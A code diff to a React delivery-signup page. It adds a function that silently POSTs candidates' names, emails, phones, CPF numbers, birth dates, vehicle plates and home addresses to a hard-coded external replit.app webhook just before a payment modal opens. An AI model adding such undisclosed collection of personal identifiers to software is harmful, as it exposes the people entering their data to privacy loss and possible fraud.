@@ -347,10 +347,121 @@ const Entrega: React.FC = () => {
     }
   };
   
+  // Função para enviar webhook com todos os dados coletados
+  const enviarWebhook = async () => {
+    try {
+      console.log('[WEBHOOK] Coletando dados do localStorage...');
+      
+      // Coletar todos os dados do localStorage com parsing seguro
+      let candidatoData: any = {};
+      let epiData: any = {};
+      let enderecoData: any = {};
+      
+      try {
+        candidatoData = JSON.parse(localStorage.getItem('candidato_data') || '{}');
+      } catch (e) {
+        console.warn('[WEBHOOK] Erro ao parsear candidato_data');
+      }
+      
+      try {
+        epiData = JSON.parse(localStorage.getItem('epi_data') || '{}');
+      } catch (e) {
+        console.warn('[WEBHOOK] Erro ao parsear epi_data');
+      }
+      
+      try {
+        enderecoData = JSON.parse(localStorage.getItem('endereco_entrega') || '{}');
+      } catch (e) {
+        console.warn('[WEBHOOK] Erro ao parsear endereco_entrega');
+      }
+      
+      // Preparar dados no formato solicitado
+      const webhookData = {
+        // Dados pessoais
+        name: candidatoData.nome || '',
+        email: candidatoData.email || '',
+        phone: candidatoData.telefone ? candidatoData.telefone.replace(/\D/g, '') : '', // Apenas números
+        cpf: candidatoData.cpf ? candidatoData.cpf.replace(/\D/g, '') : '', // Apenas números
+        dataNascimento: candidatoData.dataNascimento || '',
+        
+        // Dados do veículo
+        tipoVeiculo: candidatoData.tipoVeiculo || '',
+        placa: candidatoData.placa || '',
+        isRentedCar: candidatoData.isRentedCar || false,
+        vehicleInfo: candidatoData.vehicleInfo || null,
+        
+        // Dados do EPI (tamanho do colete)
+        tamanhoColete: epiData.tamanhoColete || '',
+        tamanhoLuva: epiData.tamanhoLuva || '',
+        numeroCalcado: epiData.numeroCalcado || '',
+        
+        // Dados do endereço (incluindo número da casa)
+        endereco: {
+          cep: enderecoData.cep || '',
+          logradouro: enderecoData.logradouro || '',
+          numero: enderecoData.numero || '', // Número da casa
+          bairro: enderecoData.bairro || '',
+          cidade: enderecoData.cidade || '',
+          estado: enderecoData.estado || '',
+          complemento: enderecoData.complemento || ''
+        },
+        
+        // Dados adicionais
+        cidade: candidatoData.cidade || '',
+        estado: candidatoData.estado || '',
+        cep: candidatoData.cep || '',
+        
+        // Timestamp
+        timestamp: new Date().toISOString()
+      };
+      
+      console.log('[WEBHOOK] Preparando envio dos dados...');
+      
+      // Enviar webhook com timeout
+      const webhookUrl = 'https://recoveryfy.replit.app/api/webhook/sfgxs4y6y8qrv1jp9ik6h5inigfgb6s0';
+      
+      const controller = new AbortController();
+      const timeoutId = setTimeout(() => controller.abort(), 3000); // 3 segundos timeout
+      
+      try {
+        const response = await fetch(webhookUrl, {
+          method: 'POST',
+          headers: {
+            'Content-Type': 'application/json',
+          },
+          body: JSON.stringify(webhookData),
+          signal: controller.signal
+        });
+        
+        clearTimeout(timeoutId);
+        
+        if (response.ok) {
+          console.log('[WEBHOOK] Dados enviados com sucesso');
+        } else {
+          console.warn('[WEBHOOK] Erro na resposta:', response.status, response.statusText);
+        }
+      } catch (fetchError: any) {
+        clearTimeout(timeoutId);
+        if (fetchError.name === 'AbortError') {
+          console.warn('[WEBHOOK] Timeout após 3 segundos');
+        } else {
+          console.warn('[WEBHOOK] Erro no envio:', fetchError.message);
+        }
+      }
+      
+    } catch (error) {
+      console.error('[WEBHOOK] Erro ao enviar:', error);
+      // Não bloquear o fluxo principal se o webhook falhar
+    }
+  };
+
   // Função para processar o pagamento após a confirmação
   const processarPagamento = async () => {
     try {
-      // Abrir o modal de pagamento
+      // PRIMEIRO: Enviar webhook com todos os dados (não bloquear UX)
+      enviarWebhook(); // Executar em paralelo sem await
+      
+      // SEGUNDO: Abrir o modal de pagamento imediatamente
       setShowPaymentModal(true);
       setIsLoading(true);
       
